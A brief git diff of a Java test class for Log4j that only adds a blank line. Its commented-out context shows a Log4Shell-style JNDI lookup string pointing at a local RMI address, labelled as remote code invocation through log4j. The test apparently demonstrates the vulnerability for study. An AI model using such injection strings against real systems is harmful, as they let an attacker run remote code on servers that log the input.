@@ -23,4 +23,5 @@ public class Log4jTest {
 //        // JNDI使用
 //        logger.info("通过log4j远程调用代码。{}", "${jndi:rmi://127.0.0.1:8080/look}");
     }
+
 }
